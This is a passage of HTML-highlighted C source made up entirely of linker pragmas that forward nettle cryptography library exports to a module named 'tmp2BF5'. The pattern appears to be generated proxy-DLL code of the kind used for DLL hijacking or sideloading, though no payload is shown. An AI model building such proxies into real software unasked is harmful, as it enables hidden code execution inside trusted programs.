class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_knuth_lfib_get_array=tmp2BF5.nettle_knuth_lfib_get_array,@339&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_knuth_lfib_init=tmp2BF5.nettle_knuth_lfib_init,@340&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_knuth_lfib_random=tmp2BF5.nettle_knuth_lfib_random,@341&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_lookup_hash=tmp2BF5.nettle_lookup_hash,@342&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md2=tmp2BF5.nettle_md2,@343&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md2_digest=tmp2BF5.nettle_md2_digest,@344&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md2_init=tmp2BF5.nettle_md2_init,@345&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md2_update=tmp2BF5.nettle_md2_update,@346&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md4=tmp2BF5.nettle_md4,@347&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md4_digest=tmp2BF5.nettle_md4_digest,@348&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md4_init=tmp2BF5.nettle_md4_init,@349&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md4_update=tmp2BF5.nettle_md4_update,@350&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md5=tmp2BF5.nettle_md5,@351&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md5_compress=tmp2BF5.nettle_md5_compress,@352&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md5_digest=tmp2BF5.nettle_md5_digest,@353&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md5_init=tmp2BF5.nettle_md5_init,@354&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_md5_update=tmp2BF5.nettle_md5_update,@355&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_memeql_sec=tmp2BF5.nettle_memeql_sec,@356&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_memxor=tmp2BF5.nettle_memxor,@357&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_memxor3=tmp2BF5.nettle_memxor3,@358&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_pbkdf2=tmp2BF5.nettle_pbkdf2,@359&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_pbkdf2_hmac_gosthash94cp=tmp2BF5.nettle_pbkdf2_hmac_gosthash94cp,@360&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_pbkdf2_hmac_sha1=tmp2BF5.nettle_pbkdf2_hmac_sha1,@361&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_pbkdf2_hmac_sha256=tmp2BF5.nettle_pbkdf2_hmac_sha256,@362&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_poly1305_aes_digest=tmp2BF5.nettle_poly1305_aes_digest,@363&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_poly1305_aes_set_key=tmp2BF5.nettle_poly1305_aes_set_key,@364&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_poly1305_aes_set_nonce=tmp2BF5.nettle_poly1305_aes_set_nonce,@365&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_poly1305_aes_update=tmp2BF5.nettle_poly1305_aes_update,@366&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_realloc=tmp2BF5.nettle_realloc,@367&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ripemd160=tmp2BF5.nettle_ripemd160,@368&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ripemd160_digest=tmp2BF5.nettle_ripemd160_digest,@369&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ripemd160_init=tmp2BF5.nettle_ripemd160_init,@370&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ripemd160_update=tmp2BF5.nettle_ripemd160_update,@371&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_salsa20_128_set_key=tmp2BF5.nettle_salsa20_128_set_key,@372&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_salsa20_256_set_key=tmp2BF5.nettle_salsa20_256_set_key,@373&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_salsa20_crypt=tmp2BF5.nettle_salsa20_crypt,@374&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_salsa20_set_key=tmp2BF5.nettle_salsa20_set_key,@375&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_salsa20_set_nonce=tmp2BF5.nettle_salsa20_set_nonce,@376&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_salsa20r12_crypt=tmp2BF5.nettle_salsa20r12_crypt,@377&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_serpent128=tmp2BF5.nettle_serpent128,@378&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_serpent128_set_key=tmp2BF5.nettle_serpent128_set_key,@379&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_serpent192=tmp2BF5.nettle_serpent192,@380&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_serpent192_set_key=tmp2BF5.nettle_serpent192_set_key,@381&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_serpent256=tmp2BF5.nettle_serpent256,@382&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_serpent256_set_key=tmp2BF5.nettle_serpent256_set_key,@383&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_serpent_decrypt=tmp2BF5.nettle_serpent_decrypt,@384&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_serpent_encrypt=tmp2BF5.nettle_serpent_encrypt,@385&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_serpent_set_key=tmp2BF5.nettle_serpent_set_key,@386&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha1=tmp2BF5.nettle_sha1,@387&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha1_compress=tmp2BF5.nettle_sha1_compress,@388&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha1_digest=tmp2BF5.nettle_sha1_digest,@389&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha1_init=tmp2BF5.nettle_sha1_init,@390&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha1_update=tmp2BF5.nettle_sha1_update,@391&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha224=tmp2BF5.nettle_sha224,@392&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha224_digest=tmp2BF5.nettle_sha224_digest,@393&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha224_init=tmp2BF5.nettle_sha224_init,@394&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha256=tmp2BF5.nettle_sha256,@395&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha256_digest=tmp2BF5.nettle_sha256_digest,@396&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha256_init=tmp2BF5.nettle_sha256_init,@397&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha256_update=tmp2BF5.nettle_sha256_update,@398&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha384=tmp2BF5.nettle_sha384,@399&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha384_digest=tmp2BF5.nettle_sha384_digest,@400&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha384_init=tmp2BF5.nettle_sha384_init,@401&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_224=tmp2BF5.nettle_sha3_224,@402&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_224_digest=tmp2BF5.nettle_sha3_224_digest,@403&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_224_init=tmp2BF5.nettle_sha3_224_init,@404&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_224_update=tmp2BF5.nettle_sha3_224_update,@405&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_256=tmp2BF5.nettle_sha3_256,@406&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_256_digest=tmp2BF5.nettle_sha3_256_digest,@407&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_256_init=tmp2BF5.nettle_sha3_256_init,@408&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_256_shake=tmp2BF5.nettle_sha3_256_shake,@409&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_256_update=tmp2BF5.nettle_sha3_256_update,@410&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_384=tmp2BF5.nettle_sha3_384,@411&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_384_digest=tmp2BF5.nettle_sha3_384_digest,@412&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_384_init=tmp2BF5.nettle_sha3_384_init,@413&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_384_update=tmp2BF5.nettle_sha3_384_update,@414&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_512=tmp2BF5.nettle_sha3_512,@415&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_512_digest=tmp2BF5.nettle_sha3_512_digest,@416&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_512_init=tmp2BF5.nettle_sha3_512_init,@417&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_512_update=tmp2BF5.nettle_sha3_512_update,@418&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha3_permute=tmp2BF5.nettle_sha3_permute,@419&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha512=tmp2BF5.nettle_sha512,@420&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha512_224=tmp2BF5.nettle_sha512_224,@421&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha512_224_digest=tmp2BF5.nettle_sha512_224_digest,@422&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha512_224_init=tmp2BF5.nettle_sha512_224_init,@423&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha512_256=tmp2BF5.nettle_sha512_256,@424&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha512_256_digest=tmp2BF5.nettle_sha512_256_digest,@425&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha512_256_init=tmp2BF5.nettle_sha512_256_init,@426&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha512_digest=tmp2BF5.nettle_sha512_digest,@427&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha512_init=tmp2BF5.nettle_sha512_init,@428&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_sha512_update=tmp2BF5.nettle_sha512_update,@429&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_siv_cmac_aes128_decrypt_message=tmp2BF5.nettle_siv_cmac_aes128_decrypt_message,@430&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_siv_cmac_aes128_encrypt_message=tmp2BF5.nettle_siv_cmac_aes128_encrypt_message,@431&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_siv_cmac_aes128_set_key=tmp2BF5.nettle_siv_cmac_aes128_set_key,@432&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_siv_cmac_aes256_decrypt_message=tmp2BF5.nettle_siv_cmac_aes256_decrypt_message,@433&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_siv_cmac_aes256_encrypt_message=tmp2BF5.nettle_siv_cmac_aes256_encrypt_message,@434&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_siv_cmac_aes256_set_key=tmp2BF5.nettle_siv_cmac_aes256_set_key,@435&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_siv_cmac_decrypt_message=tmp2BF5.nettle_siv_cmac_decrypt_message,@436&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_siv_cmac_encrypt_message=tmp2BF5.nettle_siv_cmac_encrypt_message,@437&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_siv_cmac_set_key=tmp2BF5.nettle_siv_cmac_set_key,@438&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_twofish128=tmp2BF5.nettle_twofish128,@439&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_twofish128_set_key=tmp2BF5.nettle_twofish128_set_key,@440&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_twofish192=tmp2BF5.nettle_twofish192,@441&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_twofish192_set_key=tmp2BF5.nettle_twofish192_set_key,@442&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_twofish256=tmp2BF5.nettle_twofish256,@443&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_twofish256_set_key=tmp2BF5.nettle_twofish256_set_key,@444&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_twofish_decrypt=tmp2BF5.nettle_twofish_decrypt,@445&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_twofish_encrypt=tmp2BF5.nettle_twofish_encrypt,@446&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_twofish_set_key=tmp2BF5.nettle_twofish_set_key,@447&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac128_digest=tmp2BF5.nettle_umac128_digest,@448&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac128_set_key=tmp2BF5.nettle_umac128_set_key,@449&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac128_set_nonce=tmp2BF5.nettle_umac128_set_nonce,@450&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac128_update=tmp2BF5.nettle_umac128_update,@451&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac32_digest=tmp2BF5.nettle_umac32_digest,@452&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac32_set_key=tmp2BF5.nettle_umac32_set_key,@453&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac32_set_nonce=tmp2BF5.nettle_umac32_set_nonce,@454&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac32_update=tmp2BF5.nettle_umac32_update,@455&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac64_digest=tmp2BF5.nettle_umac64_digest,@456&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac64_set_key=tmp2BF5.nettle_umac64_set_key,@457&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac64_set_nonce=tmp2BF5.nettle_umac64_set_nonce,@458&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac64_update=tmp2BF5.nettle_umac64_update,@459&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac96_digest=tmp2BF5.nettle_umac96_digest,@460&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac96_set_key=tmp2BF5.nettle_umac96_set_key,@461&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac96_set_nonce=tmp2BF5.nettle_umac96_set_nonce,@462&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_umac96_update=tmp2BF5.nettle_umac96_update,@463&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_version_major=tmp2BF5.nettle_version_major,@464&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_version_minor=tmp2BF5.nettle_version_minor,@465&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_xrealloc=tmp2BF5.nettle_xrealloc,@466&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_xts_aes128_decrypt_message=tmp2BF5.nettle_xts_aes128_decrypt_message,@467&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_xts_aes128_encrypt_message=tmp2BF5.nettle_xts_aes128_encrypt_message,@468&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_xts_aes128_set_decrypt_key=tmp2BF5.nettle_xts_aes128_set_decrypt_key,@469&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_xts_aes128_set_encrypt_key=tmp2BF5.nettle_xts_aes128_set_encrypt_key,@470&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_xts_aes256_decrypt_message=tmp2BF5.nettle_xts_aes256_decrypt_message,@471&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_xts_aes256_encrypt_message=tmp2BF5.nettle_xts_aes256_encrypt_message,@472&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_xts_aes256_set_decrypt_key=tmp2BF5.nettle_xts_aes256_set_decrypt_key,@473&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_xts_aes256_set_encrypt_key=tmp2BF5.nettle_xts_aes256_set_encrypt_key,@474&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_xts_decrypt_message=tmp2BF5.nettle_xts_decrypt_message,@475&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_xts_encrypt_message=tmp2BF5.nettle_xts_encrypt_message,@476&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_yarrow256_fast_reseed=tmp2BF5.nettle_yarrow256_fast_reseed,@477&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_yarrow256_init=tmp2BF5.nettle_yarrow256_init,@478&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_yarrow256_is_seeded=tmp2BF5.nettle_yarrow256_is_seeded,@479&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span 